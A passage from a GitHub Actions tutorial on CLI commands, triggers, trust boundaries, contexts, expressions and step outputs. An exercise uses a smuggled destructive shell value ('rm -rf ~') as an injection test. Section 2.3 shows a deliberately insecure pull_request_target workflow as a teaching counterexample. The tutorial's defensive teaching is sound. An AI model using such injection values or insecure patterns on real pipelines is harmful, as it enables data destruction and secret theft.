# List recent runs of one workflow, then follow the newest live
gh run list --workflow ci.yml --limit 5
gh run watch                      # pick a run interactively, exit code mirrors the result
gh run watch --exit-status        # non-zero when the run fails (useful in scripts)

# Read only the logs of failed steps
gh run view --log-failed
gh run view 1234567890 --job 9876543210 --log

# Re-run after a flaky failure
gh run rerun 1234567890 --failed  # only the failed jobs, with the same commit and inputs
gh run rerun 1234567890 --debug   # same, with runner and step debug logging on

# Start a workflow_dispatch workflow with inputs
gh workflow run deploy.yml --ref main -f tier=staging -f dry-run=true

# Download an artifact from a run
gh run download 1234567890 --name junit-report --dir ./reports
```

Debug logging has two switches. Set them as repository **variables** (or secrets) and re-run:

| Variable | Effect |
| --- | --- |
| `ACTIONS_STEP_DEBUG=true` | Prints `::debug::` lines from actions, and the expression evaluation of `if:` conditions |
| `ACTIONS_RUNNER_DEBUG=true` | Adds the runner's own diagnostic logs to the log archive |

Inside a step, you control log structure with workflow commands. The starter implements them in [`src/toolkit.js`](src/toolkit.js):

```bash
echo "::group::Install"        # collapsible section in the log viewer
npm ci
echo "::endgroup::"
echo "::notice file=src/app.js,line=12::Deprecated call"   # annotation on the PR diff
echo "::warning title=Slow test::checkout.spec took 41s"
echo "::error file=package.json::lockfile out of date"
```

### 1.8 Running Workflows Locally with act

[`act`](https://github.com/nektos/act) reads your workflow files and runs jobs in Docker containers that resemble the hosted Ubuntu image. It shortens the edit-push-wait loop for shell logic and expressions.

```bash
# List the jobs act can see for the push event
act -l push

# Run one job for a pull_request event, with a fake event payload
act pull_request -j test -e event.json

# Supply secrets and variables without putting them in the repo
act -j deploy --secret-file .secrets --var-file .vars

# Use a larger, closer-to-GitHub image for steps that need more tools
act -P ubuntu-latest=catthehacker/ubuntu:full-24.04
```

| Works well with act | Does not match GitHub |
| --- | --- |
| `run:` scripts, expressions, `if:` logic, matrices | macOS and Windows jobs |
| JavaScript and Docker actions | OIDC tokens, `GITHUB_TOKEN` permissions |
| Service containers | Caches and artifacts behave differently (local server) |
| Event payloads from a JSON file | Environments, approvals, concurrency across runs |

Use act for fast feedback, and a scratch branch with `workflow_dispatch` for anything involving identity, caching or concurrency. Lint with `actionlint` before either: it catches unknown keys, bad expressions, wrong context use and shell errors without running anything.

### 1.9 Walking Through the Starter Project

The repository is itself a working Actions project. Its CI runs the repo's own composite and JavaScript actions, so every concept in Stages 1-3 is exercised on every push.

```mermaid
flowchart TD
    CI[".github/workflows/ci.yml"] --> Lint["lint job: actionlint"]
    CI --> Test["test job: matrix Node 22, 24"]
    Test --> NodeCI["uses: ./actions/node-ci (composite)"]
    CI --> Plan["plan job"]
    Plan --> MP["uses: ./actions/matrix-plan (JavaScript, node24)"]
    MP --> Src["src/matrix.js + src/toolkit.js"]
    Plan -->|"outputs.include"| Fan["fan-out job: matrix from fromJSON()"]
    Test --> Docker["docker job: build image, run CLI"]
    Tests["test/*.test.js (node:test)"] -.->|"verify"| Src
```

| Path | What it is | Stage |
| --- | --- | --- |
| [`src/matrix.js`](src/matrix.js) | How `strategy.matrix` expands, including the `include` rules | 3.3 |
| [`src/conditions.js`](src/conditions.js) | The implicit `success()` and the status functions | 2.6 |
| [`src/toolkit.js`](src/toolkit.js) | `INPUT_*` inputs, `$GITHUB_OUTPUT` heredocs, workflow command escaping | 2.8, 4.3 |
| [`src/graph.js`](src/graph.js) | `needs:` waves, cycle detection, skip propagation | 3.1 |
| [`src/cache.js`](src/cache.js) | `hashFiles`, cache scopes, exact vs restore-key hits | 3.6 |
| [`src/concurrency.js`](src/concurrency.js) | One running plus one pending per group | 3.9 |
| [`src/oidc.js`](src/oidc.js) | `sub` claim shapes and trust-policy matching | 5.1 |
| [`actions/matrix-plan/`](actions/matrix-plan) | A JavaScript action that outputs a matrix plan | 3.4, 4.3 |
| [`actions/node-ci/`](actions/node-ci) | A composite action: setup-node, cache, `npm ci`, `npm test` | 4.1 |
| [`examples/workflows/`](examples/workflows) | Every workflow shown in Stages 1-3, linted in CI | 1-3 |
| `test/` | `node:test` suites for all of the above | all |

Run it locally (Node 22 or newer):

```bash
git clone https://github.com/TheLearningHubOrg/learn-github-actions.git
cd learn-github-actions
npm ci            # no dependencies; creates an empty node_modules
npm test          # node --test runs test/*.test.js
npm run demo      # prints a matrix plan, job waves and an effective if:
node src/cli.js matrix '{"os":["ubuntu-latest","windows-latest"],"node":[22,24]}'
docker build -t learn-gha . && docker run --rm learn-gha   # tests run during the build
```

### 1.10 Pitfalls

| Pitfall | Symptom | Fix |
| --- | --- | --- |
| Workflow file outside `.github/workflows/` or with a `.yaml` typo in the folder name | Nothing happens on push; no run appears | The path must be exactly `.github/workflows/<name>.yml` or `.yaml`. |
| Invalid YAML or unknown key | Run shows `Invalid workflow file: .github/workflows/ci.yml#L12` and no jobs | Run `actionlint` locally or in CI before pushing. |
| `export VAR=1` in one step, used in the next | Next step sees an empty variable | Append to `$GITHUB_ENV`: `echo "VAR=1" >> "$GITHUB_ENV"`. |
| Relying on default token permissions | `Resource not accessible by integration` (HTTP 403) | Declare `permissions:` per workflow or job. |
| No `timeout-minutes` | A hung test runs for 6 hours and consumes the minutes | Set a timeout on every job. |
| `runs-on` label with no matching runner | Job sits in `Queued` with "Waiting for a runner to pick up this job" | Check the label spelling, that a self-hosted runner is online, and runner-group access. |
| Self-hosted runner on a public repository | Fork PRs run attacker code inside your network | Use hosted runners for public repos, or require approval for fork PRs and use ephemeral runners. |
| Expecting `actions/checkout` to fetch history | `git describe` fails with `No names found`; changelog tools see one commit | Set `fetch-depth: 0` (all history) or a number. |

### 1.11 Best Practices

- **Declare `permissions:` at the top of every workflow**: least privilege becomes visible in review instead of depending on a repository setting.
- **Set `timeout-minutes` on every job**: hangs cost money and block concurrency groups.
- **Name steps**: the log viewer and annotations show step names, so `Install exactly what the lockfile says` beats `Run npm ci`.
- **Use `npm ci` (or the lockfile-respecting install for your stack)**: CI must build exactly what was committed.
- **Pin runner images when an upgrade should be a commit**: `ubuntu-24.04` instead of `ubuntu-latest` in release pipelines.
- **Lint workflows in CI**: actionlint finds expression and shell bugs before they reach `main`.
- **Keep one concern per workflow file**: `ci.yml`, `release.yml`, `deploy.yml` are easier to read, trigger and protect than one giant file.

### 1.12 Hands-on Exercise

Write a workflow that:

1. Runs on pushes to `main` and on manual dispatch with a boolean input `fail` (default `false`).
2. Sets `permissions: {}` and a 5-minute timeout.
3. Prints the runner OS, architecture, event name, run id and run attempt.
4. Fails with an `::error` annotation when `fail` is `true`, and has a final step that runs only after a failure.

Expected output: with `fail=false` the run is green and the last step shows as skipped. With `gh workflow run stage-1.yml -f fail=true` the run is red, the annotation "Requested failure" appears on the run summary, and the last step runs.

Solution: [`examples/workflows/s1-exercise.yml`](examples/workflows/s1-exercise.yml).

[Back to top ⤴️](#-table-of-contents)

---
## 2. Stage 2: Workflow Syntax, Triggers, Contexts & Expressions

Stage 1 ran a fixed list of steps on every push. This stage makes workflows selective and data-driven: start only on the events and paths that matter, read the event payload, branch on expressions, and pass values between steps and jobs without opening an injection hole. Prerequisite: Stage 1. Afterwards you can write a manually dispatched release workflow with typed inputs, outputs and a job summary.

```mermaid
flowchart LR
    Event["Event + payload"] --> Filter{"on: filters match?"}
    Filter -- no --> Nothing["No run"]
    Filter -- yes --> Ctx["Contexts built: github, inputs, vars, secrets"]
    Ctx --> JobIf{"jobs.id.if"}
    JobIf -- false --> Skip["Job skipped"]
    JobIf -- true --> Runner["Runner adds env, runner, steps, matrix"]
    Runner --> StepIf{"steps.if"}
    StepIf -- true --> Exec["Step runs, writes GITHUB_OUTPUT / GITHUB_ENV"]
    StepIf -- false --> SkipStep["Step skipped"]
    Exec --> StepIf
```

### 2.1 Trigger Events and Filters

GitHub Actions supports fine-grained event triggering and path filtering. This is [`examples/workflows/02-triggers.yml`](examples/workflows/02-triggers.yml):

```yaml
on:
  push:
    branches: [main, 'release/**']
    tags: ['v*.*.*']
    paths-ignore: ['docs/**', '**/*.md']
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches: [main]
    paths: ['src/**', 'package-lock.json', '.github/workflows/**']
  schedule:
    - cron: '17 3 * * 1-5'
  workflow_dispatch:
    inputs:
      tier:
        description: Where to deploy
        type: choice
        options: [staging, production]
        default: staging
      dry-run:
        description: Print the plan without deploying
        type: boolean
        default: true
```

| Field / Parameter | Purpose | Rule worth knowing |
| :--- | :--- | :--- |
| `branches` / `branches-ignore` | Filter by the pushed branch, or the PR's **base** branch | You cannot use both for one event. Use `!` patterns inside `branches` instead: `['main', '!main-legacy']`. |
| `tags` | Filter tag pushes | A push that creates only a tag does not match `branches`. Path filters are not evaluated for tag pushes. |
| `paths` / `paths-ignore` | Run only when changed files match | With both `branches` and `paths`, **both** must match. Skipped-by-path workflows report no status, so a required check on them waits forever (see Pitfalls). |
| `types` | Filter activity types of an event | `pull_request` defaults to `opened`, `synchronize`, `reopened`. Add `ready_for_review` if you skip drafts. |
| `schedule.cron` | Five-field cron in UTC | Runs on the latest commit of the default branch. Minimum interval is 5 minutes and start times can drift under load, so avoid minute `0`. |
| `workflow_dispatch.inputs` | Manual runs from the UI, `gh workflow run` or the REST API | Types: `string`, `boolean`, `choice`, `number`, `environment`. The workflow file must exist on the default branch to appear in the UI. |

Glob patterns use `*` (anything except `/`), `**` (anything, including `/`), `?`, `+`, `[]` and a leading `!` for negation. Order matters: a later `!pattern` excludes what an earlier pattern included, and a later positive pattern re-includes.

One rule causes more confusion than any other: **events created with the `GITHUB_TOKEN` do not start new workflow runs**. A workflow that pushes a commit or opens a PR with the default token will not trigger `push` or `pull_request` workflows. This prevents infinite loops. `workflow_dispatch` and `repository_dispatch` are the exceptions. When a bot commit must trigger CI, use a GitHub App token (`actions/create-github-app-token`).

### 2.2 Event Activity Types Reference Matrix

Many events support activity types that prevent unnecessary runs:

| GitHub Event | Key Activity Types | When to Trigger in CI/CD |
| :--- | :--- | :--- |
| `pull_request` | `opened`, `synchronize`, `reopened`, `ready_for_review`, `labeled` | Core testing, linting and build verification |
| `pull_request_review` | `submitted`, `edited`, `dismissed` | Acting on approvals |
| `merge_group` | `checks_requested` | Required checks when the repository uses a merge queue |
| `release` | `published`, `created`, `prereleased` | Publishing images and packages |
| `issues` | `opened`, `labeled`, `milestoned` | Bot triage and SLA escalation |
| `workflow_run` | `completed`, `requested`, `in_progress` | Privileged follow-up work after an untrusted build |
| `workflow_call` | none | Makes the file a reusable workflow (Stage 4.4) |
| `repository_dispatch` | Custom `event_type` strings | Cross-repository or external-system triggers |

`repository_dispatch` lets any system with a token start a workflow, carrying a JSON payload in `github.event.client_payload`:

```mermaid
flowchart LR
    Webhook["External service / other repo"] -->|"POST /repos/OWNER/REPO/dispatches"| Dispatch["repository_dispatch event"]
    Dispatch --> Workflow["Workflow with on: repository_dispatch: types: [deploy]"]
```

```bash
gh api repos/OWNER/REPO/dispatches \
  -f event_type=deploy \
  -F 'client_payload[service]=billing' -F 'client_payload[version]=1.8.2'
```

If your repository uses a merge queue, add `merge_group:` to the `on:` block of every workflow that produces a required check, or queued PRs will wait forever for a check that never runs.

### 2.3 `pull_request` vs `pull_request_target` vs `workflow_run`: Trust Boundaries

These three events decide whether untrusted code can reach your secrets. Learn the table before you write any workflow that comments on, labels or deploys pull requests.

| | `pull_request` | `pull_request_target` | `workflow_run` |
| --- | --- | --- | --- |
| Workflow file used | From the PR's merge commit (attacker can edit it) | From the base branch | From the default branch |
| Code checked out by default | PR merge commit | Base branch | Default branch |
| Secrets for fork PRs | None (except a read-only `GITHUB_TOKEN`) | Yes | Yes |
| Token for fork PRs | Read-only | Read/write (subject to `permissions:`) | Read/write (subject to `permissions:`) |
| Safe use | Build and test untrusted code | Label, comment, triage **without** running PR code | Post results of an untrusted build: download its artifacts, comment, upload SARIF |

```mermaid
sequenceDiagram
    autonumber
    participant Fork as Fork PR (untrusted)
    participant PR as pull_request run
    participant Store as Artifact storage
    participant WR as workflow_run run (trusted)
    participant API as GitHub API

    Fork->>PR: Opens PR, triggers CI with read-only token, no secrets
    PR->>PR: Build and test PR code
    PR->>Store: Upload results (data only, never scripts to execute)
    PR-->>WR: Completion triggers workflow_run on the default branch
    WR->>Store: Download artifact with run-id from github.event.workflow_run.id
    WR->>WR: Validate and parse the data as untrusted input
    WR->>API: Comment on the PR with a write token
```

The rule: **never check out and execute the PR's head in a `pull_request_target` or `workflow_run` job.** If the trusted job runs `npm install` on the PR's code, a malicious `postinstall` script gets your secrets.

```yaml
# Dangerous: runs attacker-controlled code with secrets and a write token.
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test
```

```yaml
# Safe: label from metadata only, never touches PR code.
on:
  pull_request_target:
    types: [opened, synchronize]
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - env:
          GH_TOKEN: ${{ github.token }}
          PR: ${{ github.event.pull_request.number }}
        run: gh pr edit "$PR" --repo "$GITHUB_REPOSITORY" --add-label needs-review
```

### 2.4 Contexts and Where Each One Is Available

Contexts are JSON objects the expression engine reads with `${{ context.path }}`:

```mermaid
flowchart LR
    GH["github context<br/>(actor, sha, ref, repository, event)"] --> Runtime
    Sec["secrets context<br/>(API tokens)"] --> Runtime
    Vars["vars context<br/>(configuration variables)"] --> Runtime
    Steps["steps context<br/>(outputs, outcome, conclusion)"] --> Runtime
    Needs["needs context<br/>(outputs and results of upstream jobs)"] --> Runtime
    Runtime["Step runtime"] --> Env["GITHUB_ENV / GITHUB_OUTPUT"]
```

| Context | Holds | Example |
| --- | --- | --- |
| `github` | Run and event data, including the full webhook payload as `github.event` | `github.ref_name`, `github.event.pull_request.number` |
| `env` | Variables from `env:` blocks | `env.NODE_ENV` |
| `vars` | Configuration variables (org, repo, environment) | `vars.AWS_REGION` |
| `secrets` | Secrets, plus `GITHUB_TOKEN` | `secrets.NPM_TOKEN` |
| `inputs` | `workflow_dispatch` or `workflow_call` inputs, typed | `inputs.dry-run` (a real boolean) |
| `job` | Current job: `status`, `container`, `services` | `job.services.postgres.ports['5432']` |
| `steps` | Earlier steps with an `id`: `outputs`, `outcome`, `conclusion` | `steps.test.outcome == 'failure'` |
| `runner` | `os`, `arch`, `temp`, `tool_cache`, `name` | `runner.os == 'Windows'` |
| `needs` | Direct dependencies: `result` and `outputs` | `needs.build.outputs.tag` |
| `strategy`, `matrix` | Matrix settings and the current combination | `matrix.node`, `strategy.job-index` |

Contexts are not available everywhere. The places people trip over:

| Workflow key | Available contexts | Not available |
| --- | --- | --- |
| `jobs.<id>.if` | `github`, `needs`, `vars`, `inputs` | `env`, `matrix`, `secrets`, `runner`, `steps` |
| `jobs.<id>.runs-on` | `github`, `needs`, `strategy`, `matrix`, `vars`, `inputs` | `env`, `secrets` |
| `jobs.<id>.steps[*].if` | `github`, `needs`, `strategy`, `matrix`, `job`, `runner`, `env`, `vars`, `steps`, `inputs` | `secrets` |
| `jobs.<id>.env`, `steps[*].env`, `with` | everything above plus `secrets` | none |
| `concurrency` (workflow level) | `github`, `inputs`, `vars` | `matrix`, `needs` |

Because `secrets` is not allowed in `if:`, test for a secret through an environment variable:

```yaml
jobs:
  publish:
    runs-on: ubuntu-latest
    env:
      HAS_NPM_TOKEN: ${{ secrets.NPM_TOKEN != '' }}
    steps:
      - if: env.HAS_NPM_TOKEN == 'true'
        run: npm publish
```

Utilising contexts in steps. Reading them through `env:` is the habit to form, for reasons 2.5 and Stage 5.4 explain:

```yaml
steps:
  - name: Inspect Execution Context
    env:
      ACTOR: ${{ github.actor }}
      REF_NAME: ${{ github.ref_name }}
    run: |
      echo "Triggered by actor: $ACTOR"
      echo "Commit SHA: $GITHUB_SHA"
      echo "Current branch or ref: $REF_NAME"
      echo "Runner architecture: $RUNNER_ARCH ($RUNNER_OS)"
```

To see a whole context, dump it once: `run: echo "$CTX"` with `env: CTX: ${{ toJSON(github.event) }}`.

### 2.5 Expressions: Operators, Functions and Type Coercion

Expressions are evaluated by GitHub (or the runner) **before** the shell sees the script. `${{ }}` in a `run:` block is text substitution, which is why untrusted values must go through `env:` instead.

| Kind | Syntax | Notes |
| --- | --- | --- |
| Literals | `null`, `true`, `42`, `0x2A`, `'it''s'` | Strings use single quotes; escape a quote by doubling it. |
| Comparison | `==`, `!=`, `<`, `<=`, `>`, `>=` | **String comparison ignores case**: `'Main' == 'main'` is true. |
| Logic | `&&`, `\|\|`, `!` | Return one of the operands, not a boolean, which enables `cond && 'a' \|\| 'b'`. |
| Property access | `a.b`, `a['b-c']`, `a.*.name` | `*` maps over arrays or objects: `github.event.pull_request.labels.*.name`. |

| Function | Example | Result |
| --- | --- | --- |
| `contains(search, item)` | `contains(github.event.pull_request.labels.*.name, 'deploy')` | Array membership, or substring for strings (case-insensitive) |
| `startsWith`, `endsWith` | `startsWith(github.ref, 'refs/tags/v')` | Case-insensitive prefix/suffix test |
| `format(fmt, ...)` | `format('{0}-{1}', runner.os, matrix.node)` | `Linux-24`; `{{` and `}}` escape braces |
| `join(array, sep)` | `join(matrix.targets, ' ')` | Space-joined string |
| `toJSON(value)` | `toJSON(github.event)` | Pretty-printed JSON string |
| `fromJSON(string)` | `fromJSON(needs.plan.outputs.include)` | Parses JSON into objects, arrays, numbers or booleans |
| `hashFiles(patterns...)` | `hashFiles('**/package-lock.json')` | SHA-256 over matching files, `''` if none match |

Loose equality converts both sides to numbers when the types differ: `null` → 0, `true` → 1, `''` → 0, `'abc'` → NaN. So `'' == 0` and `null == false` are true. Outputs and env values are always strings, so compare them as strings: `steps.x.outputs.ok == 'true'`.

The `&&`/`||` "ternary" fails when the middle value is falsy:

```yaml
env:
  # Wrong: on main this yields 'staging' because '' is falsy
  SUFFIX_BAD: ${{ github.ref == 'refs/heads/main' && '' || '-staging' }}
  # Right: put the falsy value in the || branch by inverting the test
  SUFFIX: ${{ github.ref != 'refs/heads/main' && '-staging' || '' }}
```

`fromJSON` is also how you get typed values from strings, for example a timeout stored as a configuration variable: `timeout-minutes: ${{ fromJSON(vars.TEST_TIMEOUT || '15') }}`.

### 2.6 Status Check Functions and the Implicit `success()`

Expressions let you evaluate conditions in `if:` keys:

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v5

      - name: Run Primary Tests
        id: test_run
        run: npm test

      - name: Notify on Failure
        if: failure() && github.ref == 'refs/heads/main'
        run: ./scripts/send-alert.sh

      - name: Teardown Sandbox Resources
        if: ${{ !cancelled() }}
        run: docker compose down -v
```

| Status Function | True when |
| :--- | :--- |
| `success()` | No earlier step (or ancestor job) has failed or been cancelled. Applied by default. |
| `failure()` | An earlier step failed. At job level, any ancestor job failed. |
| `always()` | Always, even when the run is cancelled. |
| `cancelled()` | The run was cancelled. |

The important rule: **an `if:` without a status function is wrapped in `success() && (...)`.** So `if: github.ref == 'refs/heads/main'` never runs after a failure. The starter models this rule in [`src/conditions.js`](src/conditions.js):

```js
const STATUS_FUNCTION = /\b(success|failure|always|cancelled)\(\s*\)/;

export function effectiveCondition(expression = '') {
  let expr = expression.trim();
  const wrapped = /^\$\{\{([\s\S]*)\}\}$/.exec(expr);
  if (wrapped) expr = wrapped[1].trim();
  if (expr === '') return 'success()';
  return STATUS_FUNCTION.test(expr) ? expr : `success() && (${expr})`;
}
```

| Line / API | Role | What happens at runtime |
| --- | --- | --- |
| `STATUS_FUNCTION` | Detects any of the four functions | If one appears anywhere, GitHub does not add `success()`. |
| `wrapped` | Strips optional `${{ }}` | `if: always()` and `if: ${{ always() }}` are the same. |
| `expr === ''` | No `if:` | A step without a condition behaves as `success()`. |
| return | Implicit wrap | `node src/cli.js condition "github.ref == 'refs/heads/main'"` prints `success() && (github.ref == 'refs/heads/main')`. |

**`always()` vs `!cancelled()`.** `always()` runs even after someone presses Cancel, which is rarely what you want for uploads or notifications: a cancelled run then waits for those steps. `!cancelled()` runs after success or failure but respects a cancel. Use `always()` only for cleanup that must happen, such as deleting a cloud resource.

**`outcome` vs `conclusion`.** With `continue-on-error: true`, a failing step has `steps.<id>.outcome == 'failure'` but `steps.<id>.conclusion == 'success'`, and the job stays green. Branch on `outcome` to react to the real result.

```yaml
- id: e2e
  continue-on-error: true
  run: npm run test:e2e
- if: steps.e2e.outcome == 'failure'
  run: echo "::warning::e2e failed but is not blocking yet"
```

### 2.7 Variables: `env` Precedence, Configuration Variables and Secrets

There are three kinds of named values, and they live in different places:

| Kind | Defined in | Read as | Visible in logs | Use for |
| --- | --- | --- | --- | --- |
| `env:` | The workflow file (workflow, job, step) | `$NAME` in shells, `env.NAME` in expressions | Yes | Values that belong in code review |
| Configuration variables | Settings → Secrets and variables → Variables (org, repo, environment) | `vars.NAME` | Yes | Non-secret settings that differ per repo or environment |
| Secrets | Same settings page, Secrets tab (org, repo, environment) | `secrets.NAME` | Masked as `***` | Tokens, passwords, keys (each at most 48 KB) |

For `env:`, the most specific level wins. Values appended to `$GITHUB_ENV` override workflow- and job-level values for later steps, but a step's own `env:` block still wins for that step.

```mermaid
flowchart TB
    W["workflow env: LEVEL=workflow"] --> J["job env: LEVEL=job"]
    J --> F["GITHUB_ENV file: LEVEL=file, from the next step on"]
    F --> S["step env: LEVEL=step, this step only"]
    S --> Shell["Shell sees the most specific value"]
```

For `vars` and `secrets`, an **environment** value beats a **repository** value, which beats an **organisation** value with the same name.

Managing variables between steps means writing to files the runner provides:

```yaml
steps:
  - name: Generate dynamic version and export it
    id: versioning
    run: |
      calc_ver="v$(date -u +'%Y.%m.%d').${GITHUB_RUN_NUMBER}"
      echo "RELEASE_VERSION=$calc_ver" >> "$GITHUB_ENV"
      echo "artifact_name=build-$calc_ver" >> "$GITHUB_OUTPUT"

  - name: Consume them in a later step
    env:
      ARTIFACT: ${{ steps.versioning.outputs.artifact_name }}
    run: |
      echo "Release version is: $RELEASE_VERSION"
      echo "Step output is: $ARTIFACT"
```

Some names cannot be set through `$GITHUB_ENV`: the runner ignores attempts to override `GITHUB_*` and `RUNNER_*` defaults, and blocks `NODE_OPTIONS` because it could inject code into every later JavaScript action.

### 2.8 Step Outputs, Job Outputs and File Commands

The runner gives every step a set of files. A step appends lines to them; the runner reads them after the step exits.

| File (env var) | Effect | Read back as |
| --- | --- | --- |
| `$GITHUB_OUTPUT` | Step output | `steps.<id>.outputs.<name>` |
| `$GITHUB_ENV` | Env var for later steps in the job | `$NAME` |
| `$GITHUB_PATH` | Prepends a directory to `PATH` for later steps | the command name |
| `$GITHUB_STEP_SUMMARY` | Markdown shown on the run summary page (1 MiB per step) | the run page |
| `$GITHUB_STATE` | Value for an action's own `post:` step | `$STATE_<name>` in the post step |

```mermaid
sequenceDiagram
    participant S1 as Step with id meta
    participant R as Runner
    participant S2 as Later step
    participant J as Job outputs
    participant D as Downstream job
    S1->>R: append "version=2026.11.03.42" to GITHUB_OUTPUT
    R->>R: parse file after the step exits
    R-->>S2: steps.meta.outputs.version
    R->>J: jobs.produce.outputs.version maps to steps.meta.outputs.version
    J-->>D: needs.produce.outputs.version
```

Single-line values are `name=value`. Multi-line values need a heredoc with a delimiter that cannot occur in the value. The starter writes them the same way the official toolkit does, in [`src/toolkit.js`](src/toolkit.js):

```js
export function formatFileCommand(name, value, delimiter = `ghadelimiter_${randomUUID()}`) {
  const text = typeof value === 'string' ? value : JSON.stringify(value);
  if (!text.includes('\n') && !text.includes('\r')) return `${name}=${text}${EOL}`;
  if (name.includes(delimiter) || text.includes(delimiter)) {
    throw new Error('Delimiter must not appear in the name or value');
  }
  return `${name}<<${delimiter}${EOL}${text}${EOL}${delimiter}${EOL}`;
}
```

| Line | Why |
| --- | --- |
| `randomUUID()` delimiter | A fixed delimiter such as `EOF` lets a value containing a line `EOF` end the block and inject `admin=true` as a second output. |
| `JSON.stringify` | Outputs are strings; objects must be serialised and parsed back with `fromJSON`. |
| delimiter check | Refuses rather than writing an ambiguous file. |
| `EOL` | The runner accepts the platform line ending, so Windows runners work too. |

The same pattern in Bash, from [`examples/workflows/03-contexts-and-outputs.yml`](examples/workflows/03-contexts-and-outputs.yml):

```bash
delimiter="ghadelim_$(openssl rand -hex 8)"
{
  echo "notes<<$delimiter"
  git log --oneline -3
  echo "$delimiter"
} >> "$GITHUB_OUTPUT"
```

Job outputs expose step outputs to other jobs. They are capped at 1 MB per job and 50 MB per run, and an output whose value contains a secret is not sent at all:

```yaml
jobs:
  produce:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.meta.outputs.version }}
    steps:
      - id: meta
        run: echo "version=1.4.0" >> "$GITHUB_OUTPUT"
  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - env:
          VERSION: ${{ needs.produce.outputs.version }}
        run: echo "building $VERSION"
```

### 2.9 Shells, `defaults` and `working-directory`

The `shell:` key, or its absence, changes the flags your script runs with:

| `shell:` | Command the runner executes | Fails on |
| --- | --- | --- |
| (unset, Linux/macOS) | `bash -e {0}` | Any failing command, **but not a failing command in a pipe** |
| `bash` | `bash --noprofile --norc -eo pipefail {0}` | Any failing command, including inside pipes |
| (unset, Windows) / `pwsh` | `pwsh -command ". '{0}'"` | Terminating errors; check `$LASTEXITCODE` after native tools |
| `sh` | `sh -e {0}` | Failing commands |
| `python` | `python {0}` | Uncaught exceptions |
| custom | e.g. `perl {0}` | Whatever the program's exit code says |

The difference between unset and `bash` is `pipefail`. `npm test | tee test.log` succeeds with the unset shell even when the tests fail, because `tee` exits 0. Set the shell once:

```yaml
defaults:
  run:
    shell: bash
    working-directory: services/api

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - run: npm ci                       # runs in services/api
      - run: npm test | tee test.log      # fails if npm test fails
      - working-directory: services/web   # per-step override
        run: npm ci
```

`defaults.run` applies only to `run:` steps, not to actions called with `uses:`. Composite actions must set `shell:` on each of their own `run:` steps.

### 2.10 Pitfalls

| Pitfall | Symptom | Fix |
| --- | --- | --- |
| A bot pushes with `GITHUB_TOKEN` and expects CI | The pushed commit has no checks | Use a GitHub App token, or call the workflow with `workflow_dispatch`. |
| Required check on a workflow with `paths:` filters | PR stuck on "Expected — Waiting for status to be reported" | Remove the path filter and skip inside the job, or use a "paths-changed" job that always reports. |
| `if: matrix.os == 'windows-latest'` at job level | `Unrecognized named-value: 'matrix'` | Job-level `if` cannot read `matrix`; move the condition to the steps or exclude the combination. |
| `if: secrets.TOKEN != ''` | `Unrecognized named-value: 'secrets'` | Map the secret to `env:` and test `env.HAS_TOKEN == 'true'`. |
| `if: github.ref == 'refs/heads/main'` cleanup step after a failure | Step shows as skipped | Add a status function: `if: ${{ !cancelled() && github.ref == 'refs/heads/main' }}`. |
| `if: steps.check.outputs.ok == true` | Never true | Outputs are strings: compare with `'true'`. |
| `${{ github.event.pull_request.title }}` inside `run:` | Shell syntax errors on odd titles, or command injection | Pass through `env:` and quote `"$TITLE"`. |
| Unset shell with a pipe | Failing tests reported as passing | `defaults: run: shell: bash` to get `pipefail`. |
| Fixed `EOF` delimiter for multi-line output | Truncated output or injected keys when the value contains `EOF` | Random delimiter (see 2.8). |
| `schedule` on a fork or inactive public repo | Nightly job silently stops | Scheduled workflows are disabled after 60 days without repository activity; re-enable or add activity. |

### 2.11 Best Practices

- **Filter early with `on:`, not with `if:`**: a workflow that never starts costs nothing and adds no noise to the checks list.
- **Route every `${{ }}` that touches a shell through `env:`**: it removes the whole class of injection bugs.
- **Use `vars` for settings and `secrets` only for secrets**: masked values make logs unreadable and are harder to audit.
- **Prefer `!cancelled()` to `always()`**: cancel buttons keep working.
- **Compare outputs as strings or parse them with `fromJSON`**: there are no typed outputs.
- **Set `defaults.run.shell: bash`**: you get `pipefail` and the same shell on Windows runners (Git Bash).
- **Use random heredoc delimiters for multi-line outputs**: values from git, APIs or users can contain any line.
- **Add `merge_group` next to `pull_request` when a merge queue is on**: required checks must run for queued PRs too.

### 2.12 Hands-on Exercise

Build a `workflow_dispatch` workflow with:

1. A free-text `release-name` input (treat it as untrusted) and a `choice` input `bump` with `patch`, `minor`, `major`.
2. A `plan` job that reads `version` from `package.json`, computes the next version, and exposes it as a job output.
3. An `announce` job that writes a job summary with the next version and the release name, without ever putting `${{ inputs.release-name }}` directly in a script.

Expected output: running `gh workflow run stage-2.yml -f release-name='"; rm -rf ~ #' -f bump=minor` on a repo at `1.0.0` produces a summary "Release 1.1.0" with the name shown literally, and nothing is executed.

Solution: [`examples/workflows/s2-exercise.yml`](examples/workflows/s2-exercise.yml).

[Back to top ⤴️](#-table-of-contents)

---
## 3. Stage 3: Pipeline Orchestration: Jobs, Matrices, Caching, Artifacts & Concurrency

A real pipeline is a graph of jobs: lint and test in parallel, build once, test the build on several platforms, deploy one environment at a time. This stage covers the scheduling rules behind that graph and the two storage systems (caches and artifacts) that make it fast. Prerequisite: Stages 1 and 2. Afterwards you can build a pipeline that plans its own matrix, reuses dependencies between runs, and never runs two deploys at once.

```mermaid
flowchart LR
    subgraph Wave1["Wave 1 (parallel)"]
        Lint["lint"]
        Test["test matrix x6"]
    end
    subgraph Wave2["Wave 2"]
        Build["build"]
    end
    subgraph Wave3["Wave 3"]
        Verify["verify-package"]
    end
    Lint --> Build
    Test --> Build
    Build -->|"artifact: package"| Verify
    Cache[("actions/cache<br/>~/.npm")] -.->|"restore / save"| Test
    Verify --> Deploy["deploy (concurrency: deploy-staging)"]
```

### 3.1 Directed Dependency Graphs with `needs:` and Parallelism

Jobs in a workflow run in parallel by default. `needs:` adds edges and turns the jobs into a directed acyclic graph:

```mermaid
graph TD
    Lint["Job: Lint & Static Analysis"] --> Build["Job: Compile & Build"]
    Unit["Job: Unit Tests"] --> Build
    Build --> Integration["Job: Integration & E2E Tests"]
